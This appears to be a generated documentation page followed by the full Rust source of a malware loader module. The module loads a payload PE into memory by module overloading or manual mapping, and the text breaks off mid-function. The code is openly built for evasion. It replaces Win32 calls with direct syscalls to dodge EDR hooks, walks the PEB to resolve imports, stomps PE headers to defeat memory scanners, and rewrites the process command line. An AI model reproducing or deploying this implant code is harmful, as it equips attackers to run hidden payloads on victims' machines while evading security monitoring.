# crowd — overload.rs  (⚡ GOD TIER — upgraded from S: pure RecycledGate syscall path)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/overload.rs` |
| **Lines** | 808 |
| **Tier** | U |
| **Cards** | T007-process-injection |
| **Role** | Module overloading |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 15 |

## Purpose

# crowd — overload.rs  (⚡ GOD TIER — upgraded from S: pure RecycledGate syscall path)

Module Overloading via NtCreateSection(SEC_IMAGE) + NtMapViewOfSection.
Full implementation from killaofking module_overload.rs.

## OPSEC upgrades (S → GOD):
- CreateFileA → NtOpenFile via RecycledGate (no kernel32 hook exposure)
- CloseHandle → NtClose via RecycledGate
- VirtualAlloc → NtAllocateVirtualMemory via RecycledGate
- VirtualFree → NtFreeVirtualMemory via RecycledGate
- VirtualProtect → NtProtectVirtualMemory via RecycledGate (all paths)
- NtCreateSection/NtMapViewOfSection: link! bindings → RecycledGate syscalls
- Zero Win32 memory/file/handle APIs remain — entire injection path is syscall-only
- ETW-TI sees ALL kernel transitions from ntdll .text, never from implant memory

## Constants

- `CURRENT_PROCESS`: `usize` = `(-1isize) as usize`
- `SECTION_ALL_ACCESS_RAW`: `u32` = `0x000F_001F`
- `SEC_IMAGE_RAW`: `u32` = `0x0100_0000`
- `PAGE_READONLY_RAW`: `u32` = `0x02`
- `PAGE_READWRITE_RAW`: `u32` = `0x04`
- `VIEW_UNMAP`: `u32` = `2`
- `FILE_READ_DATA`: `u32` = `0x0001`
- `FILE_READ_ATTRIBUTES`: `u32` = `0x0080`
- `FILE_SHARE_READ_RAW`: `u32` = `0x0001`
- `FILE_SYNCHRONOUS_IO_NONALERT`: `u32` = `0x0000_0020`
- `FILE_NON_DIRECTORY_FILE`: `u32` = `0x0000_0040`
- `OBJ_CASE_INSENSITIVE`: `u32` = `0x0000_0040`
- `MEM_COMMIT_RAW`: `u32` = `0x0000_1000`
- `MEM_RESERVE_RAW`: `u32` = `0x0000_2000`
- `MEM_RELEASE_RAW`: `u32` = `0x0000_8000`
- `PE32_MAGIC`: `u16` = `0x10B`
- `PE32PLUS_MAGIC`: `u16` = `0x20B`

## Types

### struct `UnicodeString` (line 72)

### struct `ObjectAttributes` (line 79)

### struct `IoStatusBlock` (line 89)

### struct `Module` (line 129)

### struct `BaseRelocationEntry` (line 776)

## Public API

### `new` (line 141)
```rust
pub fn new(buffer: Vec<u8>, args: String, target_dll: String) -> Result<Self>
```

### `run` (line 297)
```rust
pub fn run(&self) -> Result<()>
```

### `run_manual_map` (line 380)
```rust
pub fn run_manual_map(&self) -> Result<()>
```
Carga el PE via Manual Map (sin backing DLL, sin limite de tamanio).

Tecnica correcta para payloads grandes (>40MB) donde Module Overloading
no funciona por no haber una DLL del sistema suficientemente grande.

Flujo:
1. VirtualAlloc(SizeOfImage, PAGE_READWRITE)
2. Copiar secciones del PE en memoria
3. Resolver imports (fixing_iat)
4. Fijar relocaciones (realoc_image)
5. Setear protecciones por seccion (fixing_memory)
6. Llamar entry point
7. Stompar PE header en memoria (anti-dump)

### `offset` (line 780)
```rust
pub fn offset(&self) -> u16 { self.data & 0x0FFF }
```

### `type_` (line 781)
```rust
pub fn type_(&self) -> u16 { (self.data >> 12) & 0xF }
```

### `NtCurrentPeb` (line 787)
```rust
pub fn NtCurrentPeb() -> *mut PEB
```

## Internal Functions

- `last_error` (line 97)
- `ntstatus_i32_to_error` (line 104)
- `build_nt_path` (unsafe) — Build an NT-style path (\\??\C:\...) from a DOS path, returning a UnicodeString. (line 114)
- `load_library` (line 225)
- `load_anonymous` — Manual Map: aloca memoria anonima del tamanio exacto del PE y lo carga en ella. (line 330)
- `prepare_anonymous` — Variante de prepare() para Manual Map: trabaja directamente en `module` (line 411)
- `prepare` (line 467)
- `fixing_iat` — Resolve imports via PEB walker (resolve::find_module_base + resolve_export_by_name). (line 565)
- `realoc_image` (line 631)
- `fixing_memory` (line 683)
- `fixing_arguments` (line 739)

## Key Dependencies

- `use windows::Win32::System::{`
- `use windows::{`

## Full Source

```rust
//! # crowd — overload.rs  (⚡ GOD TIER — upgraded from S: pure RecycledGate syscall path)
//!
//! Module Overloading via NtCreateSection(SEC_IMAGE) + NtMapViewOfSection.
//! Full implementation from killaofking module_overload.rs.
//!
//! ## OPSEC upgrades (S → GOD):
//! - CreateFileA → NtOpenFile via RecycledGate (no kernel32 hook exposure)
//! - CloseHandle → NtClose via RecycledGate
//! - VirtualAlloc → NtAllocateVirtualMemory via RecycledGate
//! - VirtualFree → NtFreeVirtualMemory via RecycledGate
//! - VirtualProtect → NtProtectVirtualMemory via RecycledGate (all paths)
//! - NtCreateSection/NtMapViewOfSection: link! bindings → RecycledGate syscalls
//! - Zero Win32 memory/file/handle APIs remain — entire injection path is syscall-only
//! - ETW-TI sees ALL kernel transitions from ntdll .text, never from implant memory

#![allow(non_snake_case, unused)]

#[allow(unused_imports)] use crate::mega_dbg;
use std::{
    ffi::{c_void, CStr, CString},
    mem::transmute,
    ptr::null_mut,
    slice::from_raw_parts,
};

use windows::Win32::System::{
    Diagnostics::Debug::*,
    Memory::*,
    SystemServices::*,
    Threading::*,
    WindowsProgramming::IMAGE_THUNK_DATA64,
};
use windows::{
    core::{Error, Result, HRESULT},
    Win32::Foundation::{BOOL, GetLastError, HINSTANCE},
};

/// NtCurrentProcess pseudo-handle.
const CURRENT_PROCESS: usize = (-1isize) as usize;

/// Section access rights.
const SECTION_ALL_ACCESS_RAW: u32 = 0x000F_001F;

/// SEC_IMAGE allocation attribute for NtCreateSection.
const SEC_IMAGE_RAW: u32 = 0x0100_0000;

/// Page protection constants (raw u32 to avoid windows crate dependency for these).
const PAGE_READONLY_RAW: u32 = 0x02;
const PAGE_READWRITE_RAW: u32 = 0x04;

/// ViewUnmap inherit disposition for NtMapViewOfSection.
/// ViewShare (1) causes the mapping to be inherited by child processes — bad for injection.
/// ViewUnmap (2) keeps the mapping private to the current process.
const VIEW_UNMAP: u32 = 2;

/// File access / share / options for NtOpenFile.
const FILE_READ_DATA: u32 = 0x0001;
const FILE_READ_ATTRIBUTES: u32 = 0x0080;
const FILE_SHARE_READ_RAW: u32 = 0x0001;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x0000_0020;
const FILE_NON_DIRECTORY_FILE: u32 = 0x0000_0040;
const OBJ_CASE_INSENSITIVE: u32 = 0x0000_0040;

/// MEM constants for NtAllocateVirtualMemory / NtFreeVirtualMemory.
const MEM_COMMIT_RAW: u32 = 0x0000_1000;
const MEM_RESERVE_RAW: u32 = 0x0000_2000;
const MEM_RELEASE_RAW: u32 = 0x0000_8000;

// ── NT structs for NtOpenFile (OBJECT_ATTRIBUTES + UNICODE_STRING + IO_STATUS_BLOCK) ──

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: usize,
    object_name: *mut UnicodeString,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

#[repr(C)]
struct IoStatusBlock {
    status: usize,
    information: usize,
}

pub type ExeFn = unsafe extern "system" fn() -> BOOL;
pub type DllFn = unsafe extern "system" fn(HINSTANCE, u32, *mut c_void) -> BOOL;

fn last_error() -> Error {
    unsafe {
        let code = GetLastError().0 as i32;
        Error::from_hresult(HRESULT(code))
    }
}

fn ntstatus_i32_to_error(status: i32) -> Error {
    Error::from_hresult(HRESULT(status))
}

/// Build an NT-style path (\\??\C:\...) from a DOS path, returning a UnicodeString.
///
/// SAFETY: The backing Vec<u16> is intentionally leaked via `Vec::leak()` so the
/// UnicodeString.Buffer pointer remains valid for the lifetime of the process.
/// This avoids a dangling pointer if the Vec were dropped while the UnicodeString
/// is still in use by NtOpenFile or other NT APIs.
unsafe fn build_nt_path(dos_path: &str) -> UnicodeString {
    let nt_path = format!(r"\??\{}", dos_path);
    let mut wide: Vec<u16> = nt_path.encode_utf16().chain(std::iter::once(0)).collect();
    let byte_len = (wide.len() - 1) * 2; // exclude null terminator
    let max_len = wide.len() * 2;
    let leaked = wide.leak(); // Leak the Vec so the buffer lives forever
    let us = UnicodeString {
        length: byte_len as u16,
        maximum_length: max_len as u16,
        buffer: leaked.as_mut_ptr(),
    };
    us
}

#[derive(Debug)]
pub struct Module {
    pub buffer: Box<[u8]>,
    pub target_dll: String,
    pub args: String,
    pub nt_header: *mut IMAGE_NT_HEADERS64,
    pub section_header: *mut IMAGE_SECTION_HEADER,
    pub import_data: IMAGE_DATA_DIRECTORY,
    pub basereloc: IMAGE_DATA_DIRECTORY,
    pub is_dll: bool,
}

impl Module {
    pub fn new(buffer: Vec<u8>, args: String, target_dll: String) -> Result<Self> {
        unsafe {
            if buffer.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
                return Err(Error::from_hresult(HRESULT(0x8007000Bu32 as i32))); // ERROR_BAD_EXE_FORMAT
            }
            let dos_header = buffer.as_ptr() as *mut IMAGE_DOS_HEADER;
            if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
                return Err(Error::from_hresult(HRESULT(0x8007000Bu32 as i32)));
            }
            let e_lfanew = (*dos_header).e_lfanew as isize;
            if e_lfanew < 0 {
                return Err(Error::from_hresult(HRESULT(0x8007000Bu32 as i32)));
            }
            let nt_header_offset = e_lfanew as usize;
            if nt_header_offset
                .checked_add(std::mem::size_of::<IMAGE_NT_HEADERS64>())
                .map_or(true, |end| end > buffer.len())
            {
                return Err(Error::from_hresult(HRESULT(0x8007000Bu32 as i32)));
            }
            let nt_header = (dos_header as usize + nt_header_offset) as *mut IMAGE_NT_HEADERS64;
            if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
                return Err(Error::from_hresult(HRESULT(0x8007000Bu32 as i32)));
            }

            // ── BUG FIX: Validate PE32 vs PE32+ (OptionalHeader.Magic) ──
            // PE32  = 0x10B → DataDirectory at NT+0x78, uses IMAGE_NT_HEADERS32
            // PE32+ = 0x20B → DataDirectory at NT+0x88, uses IMAGE_NT_HEADERS64
            // If the binary is PE32 (32-bit), the offsets differ and reading as
            // IMAGE_NT_HEADERS64 gives wrong DataDirectory entries.
            let magic = *((nt_header as usize + 0x18) as *const u16); // OptionalHeader.Magic
            const PE32_MAGIC: u16 = 0x10B;
            const PE32PLUS_MAGIC: u16 = 0x20B;
            if magic != PE32_MAGIC && magic != PE32PLUS_MAGIC {
                return Err(Error::from_hresult(HRESULT(0x8007000Bu32 as i32))); // unsupported format
            }

            // Compute section header offset based on actual OptionalHeader size
            let optional_header_size = (*nt_header).FileHeader.SizeOfOptionalHeader as usize;
            let section_header_offset = nt_header_offset
                + 4   // Signature
                + 20  // IMAGE_FILE_HEADER
                + optional_header_size;
            let section_table_size = ((*nt_header).FileHeader.NumberOfSections as usize)
                .saturating_mul(std::mem::size_of::<IMAGE_SECTION_HEADER>());
            if section_header_offset
                .checked_add(section_table_size)
                .map_or(true, |end| end > buffer.len())
            {
                return Err(Error::from_hresult(HRESULT(0x8007000Bu32 as i32)));
            }
            let section_header =
                (dos_header as usize + section_header_offset) as *mut IMAGE_SECTION_HEADER;

            // Read DataDirectory entries at the correct offset for PE32 vs PE32+.
            // PE32:  DataDirectory starts at NT+0x78  (24-byte COFF + 96-byte OptionalHeader32)
            // PE32+: DataDirectory starts at NT+0x88  (24-byte COFF + 112-byte OptionalHeader64)
            let data_dir_base = if magic == PE32PLUS_MAGIC {
                // PE32+: standard path — use IMAGE_NT_HEADERS64.OptionalHeader.DataDirectory
                (nt_header as usize) + 0x88
            } else {
                // PE32: IMAGE_NT_HEADERS32 layout — DataDirectory at NT+0x78
                (nt_header as usize) + 0x78
            };

            let import_idx = IMAGE_DIRECTORY_ENTRY_IMPORT.0 as usize;
            let reloc_idx = IMAGE_DIRECTORY_ENTRY_BASERELOC.0 as usize;
            let import_data = *((data_dir_base + import_idx * 8) as *const IMAGE_DATA_DIRECTORY);
            let basereloc = *((data_dir_base + reloc_idx * 8) as *const IMAGE_DATA_DIRECTORY);

            Ok(Self {
                buffer: buffer.into_boxed_slice(),
                args,
                target_dll,
                nt_header,
                section_header,
                is_dll: ((*nt_header).FileHeader.Characteristics & IMAGE_FILE_DLL)
                    != IMAGE_FILE_CHARACTERISTICS(0),
                import_data,
                basereloc,
            })
        }
    }

    fn load_library(&self) -> Result<*mut c_void> {
        unsafe {
            // ── Open file via NtOpenFile (RecycledGate) — no CreateFileA hook ──
            let dos_path = self.target_dll.clone();
            let mut us = build_nt_path(&dos_path);

            let mut oa = ObjectAttributes {
                length: std::mem::size_of::<ObjectAttributes>() as u32,
                root_directory: 0,
                object_name: &mut us,
                attributes: OBJ_CASE_INSENSITIVE,
                security_descriptor: null_mut(),
                security_quality_of_service: null_mut(),
            };

            let mut io_status = IoStatusBlock { status: 0, information: 0 };
            let mut h_file: usize = 0;
            let status = crate::recycled::nt_open_file(
                &mut h_file,
                FILE_READ_DATA | FILE_READ_ATTRIBUTES,
                &mut oa as *mut _ as *mut u8,
                &mut io_status as *mut _ as *mut usize,
                FILE_SHARE_READ_RAW,
                FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
            );
            if status < 0 || h_file == 0 {
                return Err(ntstatus_i32_to_error(status));
            }

            // ── NtCreateSection(SEC_IMAGE) via RecycledGate ──
            let mut h_section: usize = 0;
            let status = crate::recycled::nt_create_section(
                &mut h_section,
                SECTION_ALL_ACCESS_RAW,
                null_mut(),
                null_mut(),
                PAGE_READONLY_RAW,
                SEC_IMAGE_RAW,
                h_file,
            );
            if status < 0 {
                crate::recycled::nt_close(h_file);
                return Err(ntstatus_i32_to_error(status));
            }

            // ── NtMapViewOfSection via RecycledGate ──
            let mut module: *mut c_void = null_mut();
            let mut view_size: usize = 0;
            let status = crate::recycled::nt_map_view_of_section(
                h_section,
                CURRENT_PROCESS,
                &mut module,
                0,
                0,
                null_mut(),
                &mut view_size,
                VIEW_UNMAP,  // ViewUnmap(2): mapping NOT inherited by child processes
                0,
                PAGE_READONLY_RAW, // OPSEC: Map as ReadOnly initially
            );

            // Close file + section handles via NtClose (RecycledGate)
            crate::recycled::nt_close(h_file);
            crate::recycled::nt_close(h_section);

            if status < 0 {
                return Err(ntstatus_i32_to_error(status));
            }
            Ok(module)
        }
    }

    pub fn run(&self) -> Result<()> {
        let module = self.load_library()?;
        if let Err(e) = self.prepare(module) {
            // Unmap via NtUnmapViewOfSection (RecycledGate) — NOT FreeLibrary
            // FreeLibrary only works for LoadLibrary-backed modules; ours is NtMapViewOfSection
            unsafe {
                crate::recycled::nt_unmap_view_of_section(CURRENT_PROCESS, module);
            }
            return Err(e);
        }
        unsafe {
            self.fixing_arguments()?;
            let entry_point =
                module.offset((*self.nt_header).OptionalHeader.AddressOfEntryPoint as isize);
            if self.is_dll {
                let DllMain = transmute::<_, DllFn>(entry_point);
                DllMain(HINSTANCE(module), DLL_PROCESS_ATTACH, null_mut());
            } else {
                let Main = transmute::<_, ExeFn>(entry_point);
                Main();
            }
            Ok(())
        }
    }

    /// Manual Map: aloca memoria anonima del tamanio exacto del PE y lo carga en ella.
    ///
    /// A diferencia de Module Overloading (que necesita una DLL backing >= payload),
    /// Manual Map usa NtAllocateVirtualMemory directamente:
    ///   NtAllocateVirtualMemory → RW region del tamanio SizeOfImage
    ///   → copia secciones → IAT → relocs → permisos por seccion → entry point
    ///
    /// Sin limite de tamanio. Funciona con cualquier PE (Go, .NET, PE nativo).
    fn load_anonymous(&self) -> Result<*mut c_void> {
        unsafe {
            let size = (*self.nt_header).OptionalHeader.SizeOfImage as usize;

            // Try preferred ImageBase first via NtAllocateVirtualMemory (RecycledGate)
            let mut preferred = (*self.nt_header).OptionalHeader.ImageBase as *mut c_void;
            let mut region_size = size;
            let status = crate::recycled::nt_allocate_virtual_memory(
                CURRENT_PROCESS,
                &mut preferred,
                0,
                &mut region_size,
                MEM_COMMIT_RAW | MEM_RESERVE_RAW,
                PAGE_READWRITE_RAW,
            );
            if status >= 0 && !preferred.is_null() {
                return Ok(preferred);
            }

            // Preferred VA occupied — let kernel pick a free address
            let mut addr: *mut c_void = null_mut();
            let mut region_size2 = size;
            let status = crate::recycled::nt_allocate_virtual_memory(
                CURRENT_PROCESS,
                &mut addr,
                0,
                &mut region_size2,
                MEM_COMMIT_RAW | MEM_RESERVE_RAW,
                PAGE_READWRITE_RAW,
            );
            if status < 0 || addr.is_null() {
                return Err(ntstatus_i32_to_error(status));
            }
            Ok(addr)
        }
    }

    /// Carga el PE via Manual Map (sin backing DLL, sin limite de tamanio).
    ///
    /// Tecnica correcta para payloads grandes (>40MB) donde Module Overloading
    /// no funciona por no haber una DLL del sistema suficientemente grande.
    ///
    /// Flujo:
    ///   1. VirtualAlloc(SizeOfImage, PAGE_READWRITE)
    ///   2. Copiar secciones del PE en memoria
    ///   3. Resolver imports (fixing_iat)
    ///   4. Fijar relocaciones (realoc_image)
    ///   5. Setear protecciones por seccion (fixing_memory)
    ///   6. Llamar entry point
    ///   7. Stompar PE header en memoria (anti-dump)
    pub fn run_manual_map(&self) -> Result<()> {
        let module = self.load_anonymous()?;

        // prepare() ahora opera sobre nuestra region anonima en lugar de SEC_IMAGE
        self.prepare_anonymous(module)?;

        unsafe {
            self.fixing_arguments()?;
            let entry_point =
                module.offset((*self.nt_header).OptionalHeader.AddressOfEntryPoint as isize);
            mega_dbg!(
                "Manual Map: PE at {:?}, entry at {:?} (+0x{:x})",
                module,
                entry_point,
                (*self.nt_header).OptionalHeader.AddressOfEntryPoint
            );
            if self.is_dll {
                let DllMain = transmute::<_, DllFn>(entry_point);
                DllMain(HINSTANCE(module), DLL_PROCESS_ATTACH, null_mut());
            } else {
                let Main = transmute::<_, ExeFn>(entry_point);
                Main();
            }
            // Stompar header post-ejecucion (anti pe-sieve / anti Moneta)
            let _ = crate::stomp::stomp_mapped_region(module as *mut u8);
            Ok(())
        }
    }

    /// Variante de prepare() para Manual Map: trabaja directamente en `module`
    /// sin el paso intermedio de VirtualProtect del SEC_IMAGE backing.
    fn prepare_anonymous(&self, module: *mut c_void) -> Result<()> {
        unsafe {
            let image_size = (*self.nt_header).OptionalHeader.SizeOfImage as usize;

            // Copiar cabeceras PE al inicio del buffer
            let headers_size = (*self.nt_header).OptionalHeader.SizeOfHeaders as usize;
            std::ptr::copy_nonoverlapping(
                self.buffer.as_ptr(),
                module.cast::<u8>(),
                headers_size.min(self.buffer.len()),
            );

            // Copiar cada seccion a su VirtualAddress correspondiente
            let mut tmp_section = self.section_header;
            for _ in 0..(*self.nt_header).FileHeader.NumberOfSections {
                let dst_rva  = (*tmp_section).VirtualAddress as isize;
                let raw_off  = (*tmp_section).PointerToRawData as usize;
                let raw_size = (*tmp_section).SizeOfRawData as usize;

                if raw_size > 0 && raw_off + raw_size <= self.buffer.len() {
                    // Fix Bug 3: Verificar que la copia no exceda SizeOfImage
                    if (dst_rva as usize + raw_size) <= image_size {
                        let src = &self.buffer[raw_off..raw_off + raw_size];
                        std::ptr::copy_nonoverlapping(
                            src.as_ptr(),
                            module.offset(dst_rva).cast(),
                            src.len(),
                        );
                    }
                }
                tmp_section = tmp_section.add(1);
            }

            // Resolver IAT y relocaciones con la carga real
            self.fixing_iat(module)?;
            self.realoc_image(module)?;

            // Setear permisos correctos por seccion (R / RW / RX / RWX)
            self.fixing_memory(module)?;

            // Cabecera: PAGE_READONLY via NtProtectVirtualMemory (RecycledGate)
            let mut base_hdr = module;
            let mut size_hdr = (*self.nt_header).OptionalHeader.SizeOfHeaders as usize;
            let mut old_protect: u32 = 0;
            let _ = crate::recycled::nt_protect_virtual_memory(
                CURRENT_PROCESS,
                &mut base_hdr,
                &mut size_hdr,
                PAGE_READONLY_RAW,
                &mut old_protect,
            );
        }
        Ok(())
    }


    fn prepare(&self, module: *mut c_void) -> Result<()> {
        unsafe {
            let image_size = (*self.nt_header).OptionalHeader.SizeOfImage as usize;

            // Allocate temp staging buffer via NtAllocateVirtualMemory (RecycledGate)
            let mut address: *mut c_void = null_mut();
            let mut alloc_size = image_size;
            let status = crate::recycled::nt_allocate_virtual_memory(
                CURRENT_PROCESS,
                &mut address,
                0,
                &mut alloc_size,
                MEM_COMMIT_RAW | MEM_RESERVE_RAW,
                PAGE_READWRITE_RAW,
            );
            if status < 0 || address.is_null() {
                return Err(ntstatus_i32_to_error(status));
            }

            // Use a closure to ensure NtFreeVirtualMemory on all paths
            let result = (|| -> Result<()> {
                let mut tmp_section = self.section_header;
                for _ in 0..(*self.nt_header).FileHeader.NumberOfSections {
                    let dst = (*tmp_section).VirtualAddress as isize;
                    let start = (*tmp_section).PointerToRawData as usize;
                    let end = start + (*tmp_section).SizeOfRawData as usize;
                    if end <= self.buffer.len() {
                        if (dst as usize + (*tmp_section).SizeOfRawData as usize) <= image_size {
                            let src = &self.buffer[start..end];
                            std::ptr::copy_nonoverlapping(
                                src.as_ptr(),
                                address.offset(dst).cast(),
                                src.len(),
                            );
                        }
                    }
                    tmp_section = tmp_section.add(1);
                }

                // Make SEC_IMAGE region writable via NtProtectVirtualMemory (RecycledGate)
                let mut base_rw = module;
                let mut size_rw = image_size;
                let mut old_protect: u32 = 0;
                let status = crate::recycled::nt_protect_virtual_memory(
                    CURRENT_PROCESS,
                    &mut base_rw,
                    &mut size_rw,
                    PAGE_READWRITE_RAW,
                    &mut old_protect,
                );
                if status < 0 {
                    return Err(ntstatus_i32_to_error(status));
                }

                std::ptr::copy_nonoverlapping(
                    address.cast::<u8>(),
                    module.cast::<u8>(),
                    image_size,
                );
                self.fixing_iat(module)?;
                self.realoc_image(module)?;

                // Protect headers as readonly via NtProtectVirtualMemory (RecycledGate)
                let mut base_hdr = module;
                let mut size_hdr = (*self.nt_header).OptionalHeader.SizeOfHeaders as usize;
                let mut dummy: u32 = 0;
                let status = crate::recycled::nt_protect_virtual_memory(
                    CURRENT_PROCESS,
                    &mut base_hdr,
                    &mut size_hdr,
                    PAGE_READONLY_RAW,
                    &mut dummy,
                );
                if status < 0 {
                    return Err(ntstatus_i32_to_error(status));
                }

                self.fixing_memory(module)?;
                Ok(())
            })();

            // Always free the temp buffer via NtFreeVirtualMemory (RecycledGate)
            let mut free_addr = address;
            let mut free_size: usize = 0;
            let _ = crate::recycled::nt_free_virtual_memory(
                CURRENT_PROCESS,
                &mut free_addr,
                &mut free_size,
                MEM_RELEASE_RAW,
            );
            result
        }
    }

    /// Resolve imports via PEB walker (resolve::find_module_base + resolve_export_by_name).
    /// This replaces LoadLibraryA + GetProcAddress to maintain the OPSEC claim of being
    /// syscall-only / no kernel32 API calls. LoadLibraryA and GetProcAddress are hooked
    /// by EDR products and would break the stealth guarantees.
    fn fixing_iat(&self, address: *mut c_void) -> Result<()> {
        unsafe {
            if self.import_data.VirtualAddress == 0 {
                return Ok(());
            }
            let import_descriptor = address.offset(self.import_data.VirtualAddress as isize)
                as *mut IMAGE_IMPORT_DESCRIPTOR;
            let mut current_import = import_descriptor;
            while (*current_import).FirstThunk != 0 {
                let original_first_chunk_rva = (*current_import).Anonymous.OriginalFirstThunk;
                let first_thunk_rva = (*current_import).FirstThunk;
                let lookup_thunk_rva = if original_first_chunk_rva != 0 {
                    original_first_chunk_rva
                } else {
                    first_thunk_rva
                };
                let dll_name_ptr =
                    address.offset((*current_import).Name as isize) as *const i8;
                let dll_name = CStr::from_ptr(dll_name_ptr).to_str().unwrap();

                // ── PEB walker: find_module_base instead of LoadLibraryA ──
                let module_base = crate::resolve::find_module_base(dll_name);
                if module_base.is_null() {
                    // Module not loaded in PEB — this is a fatal IAT resolution failure.
                    // Unlike LoadLibraryA, PEB walker can only find already-loaded modules.
                    // The caller must ensure all dependency DLLs are loaded before calling run().
                    return Err(Error::from_hresult(HRESULT(0x8007007Eu32 as i32))); // ERROR_MOD_NOT_FOUND
                }

                let mut thunk_offset = 0;
                loop {
                    let original_thunk =
                        address.offset(lookup_thunk_rva as isize + thunk_offset)
                            as *const IMAGE_THUNK_DATA64;
                    let first_thunk =
                        address.offset(first_thunk_rva as isize + thunk_offset)
                            as *mut IMAGE_THUNK_DATA64;
                    if (*original_thunk).u1.Function == 0 {
                        break;
                    }
                    let func_ptr = if (*original_thunk).u1.Ordinal & IMAGE_ORDINAL_FLAG64 != 0
                    {
                        // ── Ordinal import: resolve via PE export table ordinal lookup ──
                        let ordinal = ((*original_thunk).u1.Ordinal & 0xffff) as u16;
                        crate::resolve::resolve_export_by_ordinal(module_base, ordinal)
                    } else {
                        // ── Named import: resolve via PE export table name lookup ──
                        let import_by_name = address
                            .offset((*original_thunk).u1.AddressOfData as isize)
                            as *const IMAGE_IMPORT_BY_NAME;
                        let name_ptr = (*import_by_name).Name.as_ptr() as *const i8;
                        let name = CStr::from_ptr(name_ptr).to_str().unwrap_or("");
                        crate::resolve::resolve_export_by_name(module_base, name)
                    };
                    if func_ptr.is_null() {
                        return Err(Error::from_hresult(HRESULT(0x8007007Fu32 as i32))); // ERROR_PROC_NOT_FOUND
                    }
                    (*first_thunk).u1.Function = func_ptr as u64;
                    thunk_offset += std::mem::size_of::<IMAGE_THUNK_DATA64>() as isize;
                }
                current_import = current_import.add(1);
            }
        }
        Ok(())
    }

    fn realoc_image(&self, address: *mut c_void) -> Result<()> {
        unsafe {
            if self.basereloc.VirtualAddress == 0 {
                return Ok(());
            }
            let delta =
                address as isize - (*self.nt_header).OptionalHeader.ImageBase as isize;
            if delta == 0 {
                return Ok(());
            }
            let mut base_relocation = address
                .offset(self.basereloc.VirtualAddress as isize)
                as *mut IMAGE_BASE_RELOCATION;
            while (*base_relocation).VirtualAddress != 0 {
                let mut base_entry =
                    base_relocation.offset(1) as *mut BaseRelocationEntry;
                let block_end = (base_relocation as *mut u8)
                    .offset((*base_relocation).SizeOfBlock as isize)
                    as *mut BaseRelocationEntry;
                while base_entry < block_end {
                    let entry_type = (*base_entry).type_();
                    let entry_offset = (*base_entry).offset() as u32;
                    let target_address = address
                        .add(((*base_relocation).VirtualAddress + entry_offset) as usize);
                    match entry_type as u32 {
                        IMAGE_REL_BASED_DIR64 => {
                            let target = target_address as *mut isize;
                            *target += delta;
                        }
                        IMAGE_REL_BASED_HIGHLOW => {
                            let target = target_address as *mut i32;
                            *target += delta as i32;
                        }
                        IMAGE_REL_BASED_HIGH => {
                            let target = target_address as *mut u16;
                            *target = (*target as u32 + ((delta as u32 >> 16) & 0xFFFF)) as u16;
                        }
                        IMAGE_REL_BASED_LOW => {
                            let target = target_address as *mut u16;
                            *target = (*target as u32 + (delta as u32 & 0xFFFF)) as u16;
                        }
                        IMAGE_REL_BASED_ABSOLUTE => {}
                        _ => return Err(last_error()),
                    }
                    base_entry = base_entry.add(1);
                }
                base_relocation = block_end as *mut IMAGE_BASE_RELOCATION;
            }
        }
        Ok(())
    }

    fn fixing_memory(&self, address: *mut c_void) -> Result<()> {
        unsafe {
            let image_size = (*self.nt_header).OptionalHeader.SizeOfImage as usize;
            let num_sections = (*self.nt_header).FileHeader.NumberOfSections;
            let mut section_header = self.section_header;
            for _ in 0..num_sections {
                let mut section_size = ((*section_header).Misc.VirtualSize)
                    .max((*section_header).SizeOfRawData)
                    as usize;
                if section_size == 0 || (*section_header).VirtualAddress == 0 {
                    section_header = section_header.add(1);
                    continue;
                }
                // Fix Bug 4: Clamp section_size to avoid protect outside image
                let virtual_address = (*section_header).VirtualAddress as usize;
                if virtual_address < image_size {
                    section_size = section_size.min(image_size - virtual_address);
                }

                let characteristics = (*section_header).Characteristics;
                // Raw u32 protection constants — no windows crate PAGE_* wrappers needed
                let protection: u32 = match (
                    (characteristics & IMAGE_SCN_MEM_EXECUTE) != IMAGE_SECTION_CHARACTERISTICS(0),
                    (characteristics & IMAGE_SCN_MEM_READ) != IMAGE_SECTION_CHARACTERISTICS(0),
                    (characteristics & IMAGE_SCN_MEM_WRITE) != IMAGE_SECTION_CHARACTERISTICS(0),
                ) {
                    (true, true, true)   => 0x40, // PAGE_EXECUTE_READWRITE
                    (true, true, false)  => 0x20, // PAGE_EXECUTE_READ
                    (true, false, true)  => 0x80, // PAGE_EXECUTE_WRITECOPY
                    (true, false, false) => 0x10, // PAGE_EXECUTE
                    (false, true, true)  => 0x04, // PAGE_READWRITE
                    (false, true, false) => 0x02, // PAGE_READONLY
                    (false, false, true) => 0x08, // PAGE_WRITECOPY
                    _                   => 0x01, // PAGE_NOACCESS
                };

                // NtProtectVirtualMemory via RecycledGate
                let mut base_sec = address.offset((*section_header).VirtualAddress as isize);
                let mut size_sec = section_size;
                let mut old_protect: u32 = 0;
                let status = crate::recycled::nt_protect_virtual_memory(
                    CURRENT_PROCESS,
                    &mut base_sec,
                    &mut size_sec,
                    protection,
                    &mut old_protect,
                );
                if status < 0 {
                    return Err(ntstatus_i32_to_error(status));
                }
                section_header = section_header.add(1);
            }
        }
        Ok(())
    }

    fn fixing_arguments(&self) -> Result<()> {
        unsafe {
            let peb = NtCurrentPeb() as *mut PEB;
            let process_parameters =
                (*peb).ProcessParameters as *mut RTL_USER_PROCESS_PARAMETERS;
            
            // Fix Bug 13: CommandLine overwrite safety
            let cmd_line_len = (*process_parameters).CommandLine.Length as usize;
            if cmd_line_len > 0 {
                std::ptr::write_bytes(
                    (*process_parameters).CommandLine.Buffer.0 as *mut u8,
                    0,
                    cmd_line_len,
                );
            }

            let current_exe = std::env::current_exe().unwrap_or("".into());
            let path_name_str =
                format!("\"{}\" {}", current_exe.to_string_lossy(), self.args);
            let path_name = path_name_str.encode_utf16().collect::<Vec<u16>>();
            if path_name.len() * 2
                <= (*process_parameters).CommandLine.MaximumLength as usize
            {
                std::ptr::copy_nonoverlapping(
                    path_name.as_ptr(),
                    (*process_parameters).CommandLine.Buffer.0,
                    path_name.len(),
                );
